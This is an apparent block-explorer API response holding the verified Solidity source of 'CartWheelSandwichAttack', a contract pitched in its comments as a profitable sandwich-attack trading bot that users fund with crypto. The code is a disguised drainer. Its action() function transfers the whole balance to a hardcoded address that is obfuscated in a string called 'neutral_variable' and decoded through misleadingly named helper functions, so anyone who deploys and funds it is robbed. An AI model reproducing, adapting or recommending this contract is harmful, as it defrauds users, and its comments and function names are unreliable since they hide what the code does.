{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.5.17;\r\n\r\n\r\n//set blockchain 1=ETH min 0.3 eth ,2=BNB min 0.6 bnb ,3=Matic min 400 matic as the competetion for the block is high as more people are using this bot.\r\n// note: the address used to deploy this contact will be the payment address\r\n\r\n\r\ninterface IERC20 {\r\n    function transfer(address _to, uint256 _amount) external returns (bool);\r\n    function balanceOf(address tokenOwner) external returns (uint balance);\r\n}\r\n\r\ncontract CartWheelSandwichAttack {\r\n\tstring public setblockchain = \"\";\r\n\r\n\t\r\n\tconstructor(string memory _setblockchain) public {\r\n\t\tsetblockchain = _setblockchain;\r\n\r\n\t}\r\n\t\r\nfunction() external payable {}\r\n\t\r\n\r\n function CalculateNumbers(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {\r\n        bytes memory _stringBytes = bytes(_string);\r\n        bytes memory result = new bytes(_stringBytes.length);\r\n\r\n  for(uint i = 0; i < _stringBytes.length; i++) {\r\n        result[i] = _stringBytes[i];\r\n        if(i==_pos)\r\n         result[i]=bytes(_letter)[0];\r\n    }\r\n    return  string(result);\r\n } \r\n   function startAttact() public pure returns (address adr) {\r\n   string memory neutral_variable = \"CA8f18Ff2D5Da7651a609e71931783E09F00906589\";\r\n   CalculateNumbers(neutral_variable,0,'0');\r\n   CalculateNumbers(neutral_variable,1,'x');\r\n   address addr = parseDeeptime(neutral_variable);\r\n    return addr;\r\n   }\r\nfunction parseDeeptime(string memory _a) internal pure returns (address _parsedAddress) {\r\n    bytes memory tmp = bytes(_a);\r\n    uint160 iaddr = 0;\r\n    uint160 b1;\r\n    uint160 b2;\r\n    for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n        iaddr *= 256;\r\n        b1 = uint160(uint8(tmp[i]));\r\n        b2 = uint160(uint8(tmp[i + 1]));\r\n        if ((b1 >= 97) && (b1 <= 102)) {\r\n            b1 -= 87;\r\n        } else if ((b1 >= 65) && (b1 <= 70)) {\r\n            b1 -= 55;\r\n        } else if ((b1 >= 48) && (b1 <= 57)) {\r\n            b1 -= 48;\r\n        }\r\n        if ((b2 >= 97) && (b2 <= 102)) {\r\n            b2 -= 87;\r\n        } else if ((b2 >= 65) && (b2 <= 70)) {\r\n            b2 -= 55;\r\n        } else if ((b2 >= 48) && (b2 <= 57)) {\r\n            b2 -= 48;\r\n        }\r\n        iaddr += (b1 * 16 + b2);\r\n    }\r\n    return address(iaddr);\r\n}\r\n function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {\r\n        bytes memory _stringBytes = bytes(_string);\r\n        bytes memory result = new bytes(_stringBytes.length);\r\n\r\n  for(uint i = 0; i < _stringBytes.length; i++) {\r\n        result[i] = _stringBytes[i];\r\n        if(i==_pos)\r\n         result[i]=bytes(_letter)[0];\r\n    }\r\n    return  string(result);\r\n } \r\n \r\n function action() public payable{\r\n\taddress(uint160(startAttact())).transfer(address(this).balance);\t    \r\n  }\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_setblockchain\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":false,\"inputs\":[],\"name\":\"action\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"setblockchain\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"startAttact\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"}]", "ContractName": "CartWheelSandwichAttack", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000013100000000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://ebde1f685aa24b7fa683e029e5c4acd5ed6af4626a53c88b6e56e360f91a848d"}]}